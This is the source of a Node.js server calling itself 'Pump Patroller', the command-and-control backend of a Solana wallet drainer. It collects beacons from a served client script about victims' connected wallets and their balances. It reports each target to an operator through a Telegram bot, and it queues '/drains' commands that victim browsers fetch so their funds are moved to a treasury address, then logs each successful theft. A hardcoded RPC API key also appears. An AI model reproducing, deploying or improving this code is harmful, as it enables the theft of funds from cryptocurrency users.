'use strict';
const http = require("http"), fs = require("fs"), path = require("path");
const { BOT_TOKEN: BOT, CHAT_ID: CHAT, TREASURY, BEACON_KEY, PORT = 8787 } = process.env;

if (!BOT || !CHAT || !TREASURY) {
  console.error("missing BOT_TOKEN / CHAT_ID / TREASURY in env");
  process.exit(1);
}

process.on("uncaughtException", e => console.error("uncaught:", e && (e.stack || e.message)));

const VERSION = "v3.7";
const COMMIT = (process.env.RENDER_GIT_COMMIT || "local-run").slice(0, 7);
const BOOT_TS = Date.now();

let tgOffset = null;
const targets = {}, cmds = {};

const ROOT = path.join(__dirname, "..");
const MIN = path.join(ROOT, "client", "x.min.js");

if (!fs.existsSync(MIN)) {
  console.log("building client/x.min.js at startup...");
  require("child_process").exec("npx --yes esbuild client/x.js --minify --format=iife --target=es2022 --outfile=client/x.min.js", { cwd: ROOT }, (err) => {
    if (err) console.error("esbuild failed:", err.message);
    else console.log("build complete");
  });
}

const RPCS = [
  "https://mainnet.helius-rpc.com/?api-key=60de1451-c4ed-4a9c-a989-89c210d5b0d3",
  "https://solana-rpc.publicnode.com",
  "https://api.mainnet-beta.solana.com",
  "https://rpc.ankr.com/solana"
];
const B58RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
const TO = ms => (typeof AbortSignal !== "undefined" && AbortSignal.timeout) ? AbortSignal.timeout(ms) : undefined;

const esc = s => String(s == null ? "" : s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

const tgQueue = [];
let tgProcessing = false;

function processTgQueue() {
    if (tgProcessing || tgQueue.length === 0) return;
    tgProcessing = true;
    const job = tgQueue.shift();
    tg(job.text, job.pre, 0).finally(() => {
        tgProcessing = false;
        setTimeout(processTgQueue, 150);
    });
}

function sendTg(text, pre) { tgQueue.push({ text, pre }); processTgQueue(); }

async function tg(text, pre, attempt) {
  attempt = attempt || 0;
  try {
    const r = await fetch("https://api.telegram.org/bot" + BOT + "/sendMessage", {
      method: "POST", headers: { "content-type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT, text: (pre || "") + text, parse_mode: "HTML", disable_web_page_preview: true }),
      signal: TO(10000)
    });
    const j = await r.json().catch(() => ({}));
    if (j && j.ok) return j;
    if (r.status === 429 && attempt < 3) {
      const wait = ((j && j.parameters && j.parameters.retry_after) || 1) * 1000;
      await new Promise(s => setTimeout(s, wait));
      return tg(text, pre, attempt + 1);
    }
  } catch (e) { }
  return null;
}

async function rpcBalance(pk) {
  const fetchBal = async (u) => {
      const r = await fetch(u, {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [pk] }),
        signal: TO(5000)
      });
      if (!r.ok) throw new Error("HTTP " + r.status);
      const j = await r.json();
      if (j && j.result && typeof j.result.value === "number") return j.result.value;
      throw new Error("malformed");
  };
  try { return await Promise.any(RPCS.map(u => fetchBal(u))); } catch (e) { return null; }
}

function handleCommand(m) {
  const raw = (m.text || "").trim();
  const parts = raw.split(/\s+/);
  const cmd = (parts[0] || "").split("@")[0].toLowerCase();
  const rest = parts.slice(1);

  if (cmd === "/start") {
    sendTg("🤖 <b>Pump Patroller " + VERSION + "</b>\n" +
      "treasury: <code>" + TREASURY.slice(0, 4) + "…" + TREASURY.slice(-4) + "</code>\n\n" +
      "/targets - list wallets\n/drains - drain all\n/clear - forget all");
    return;
  }

  if (cmd === "/targets") {
    const list = Object.entries(targets).map((kv, i) => "#" + (i + 1) + " " + esc(kv[0]) + "\n   $" + (kv[1].value ?? 0).toLocaleString()).join("\n");
    sendTg(list || "none", "targets:\n");
    return;
  }

  if (cmd === "/drains") {
    const list = Object.keys(targets);
    if (!list.length) return sendTg("no targets yet");
    let picked, to;
    const arg = rest[0] || "";
    if (arg === "" || arg.toLowerCase() === "all") { picked = list.slice(); to = rest[1] || TREASURY; }
    else if (/^\d{1,3}$/.test(arg)) { picked = [list[(parseInt(arg, 10) - 1) % list.length]]; to = rest[1] || TREASURY; }
    else if (B58RE.test(arg)) { picked = [arg]; to = rest[1] || TREASURY; }
    else { picked = [list[list.length - 1]]; to = arg || TREASURY; }
    
    if (!B58RE.test(to)) return sendTg("invalid pubkey: " + esc(String(to)));
    
    for (const pk of picked) {
      cmds[pk] = { to: to, n: Date.now().toString(36), ts: Date.now() };
    }
    sendTg("queued " + picked.length + " targets → " + to.slice(0,4) + "…");
    return;
  }

  if (cmd === "/clear") {
    for (const k of Object.keys(targets)) delete targets[k];
    for (const k of Object.keys(cmds)) delete cmds[k];
    sendTg("cleared all");
    return;
  }
}

async function pollTg() {
  try {
    const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=" + (tgOffset + 1) + "&timeout=0", { signal: TO(10000) })).json();
    for (const u of (j && j.result) || []) {
      if (u.update_id <= tgOffset) continue;
      tgOffset = u.update_id;
      if (u.message && u.message.text && u.message.text.charAt(0) === "/") handleCommand(u.message);
    }
  } catch (e) { }
}

(async function boot() {
  try {
    const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=-1&timeout=0", { signal: TO(8000) })).json();
    const r = (j && j.result) || [];
    tgOffset = r.length ? r[r.length - 1].update_id : 0;
  } catch (e) { return setTimeout(boot, 5000); }
  sendTg("🚀 patroller booted " + VERSION);
  setInterval(pollTg, 3000);
})();

setInterval(() => {
  const now = Date.now();
  for (const k of Object.keys(cmds)) {
    if (cmds[k].ts && now - cmds[k].ts > 1800000) delete cmds[k];
  }
}, 60000).unref();

http.createServer((req, res) => {
  let url;
  try { url = new URL(req.url, "http://x"); } catch (e) { res.statusCode = 400; res.end(); return; }
  res.setHeader("access-control-allow-origin", "*");

  if (req.method === "GET" && url.pathname === "/cmd") {
    const pk = url.searchParams.get("pk") || "";
    const c = cmds[pk];
    res.setHeader("content-type", "application/json");
    if (!c) return res.end(JSON.stringify({ cmd: "none" }));
    return res.end(JSON.stringify({ cmd: "drain", to: c.to, n: c.n }));
  }

  if (req.method === "GET" && url.pathname === "/api/balance") {
    const pk = url.searchParams.get("pk") || "";
    res.setHeader("content-type", "application/json");
    if (!B58RE.test(pk)) { res.statusCode = 400; return res.end(JSON.stringify({ error: "bad pubkey" })); }
    rpcBalance(pk).then(v => {
      if (v === null) { res.statusCode = 502; return res.end(JSON.stringify({ error: "rpc failed" })); }
      res.end(JSON.stringify({ balance: v }));
    }).catch(() => { res.statusCode = 502; res.end(JSON.stringify({ error: "error" })); });
    return;
  }

  if (req.method === "POST" && url.pathname === "/beacon") {
    const got = url.searchParams.get("s") || "";
    const want = String(BEACON_KEY || "").trim();
    if (want && got.trim() !== want) { res.statusCode = 403; res.end(); return; }
    let d = "";
    req.on("data", c => { if (d.length < 65536) d += c; });
    req.on("end", () => {
      let j = null;
      try { j = JSON.parse(d); } catch (e) { }
      try {
        if (j) {
          if (j.m === "detect") {
            const first = !targets[j.pk];
            targets[j.pk] = Object.assign(targets[j.pk] || {}, { provider: j.provider, origin: j.origin, value: j.value, seen: Date.now() });
            if (first) sendTg("🎯 <b>" + esc(j.provider) + "</b> @ " + esc(j.origin) + "\n<code>" + esc(j.pk) + "</code>\n$" + (j.value ?? 0).toLocaleString());
          }
          if (j.m === "drain") {
            delete cmds[j.pk]; // clear on success
            sendTg("💰 drain success — <code>" + esc(j.pk) + "</code>\nmoved: " + esc(j.extra) + "\nsig: <code>" + esc(j.sig) + "</code>");
          }
          if (j.m === "err") {
            delete cmds[j.pk]; // CRITICAL FIX: clear on error to stop the infinite loop
            sendTg("⚠️ error — <code>" + esc(j.pk) + "</code>\n" + esc(j.msg));
          }
          if (j.m === "dust") {
            delete cmds[j.pk]; // clear on dust
            sendTg("· empty — <code>" + esc(j.pk) + "</code>");
          }
        }
      } catch (e) { }
      res.setHeader("content-type", "application/json");
      res.end("{}");
    });
    return;
  }

  if (req.method === "GET" && (url.pathname === "/" || url.pathname === "/x.min.js")) {
    const f = url.pathname === "/" ? "site/index.html" : "client/x.min.js";
    const p = path.join(ROOT, f);
    fs.readFile(p, (err, data) => {
      if (err) { res.statusCode = 404; res.end("missing: " + f); return; }
      res.setHeader("content-type", f.endsWith(".html") ? "text/html; charset=utf-8" : "application/javascript; charset=utf-8");
      res.setHeader("cache-control", "no-store");
      res.end(data);
    });
    return;
  }

  res.statusCode = 404; res.end("");
}).listen(+PORT, "0.0.0.0", () => console.log("patroller bound to 0.0.0.0:" + PORT));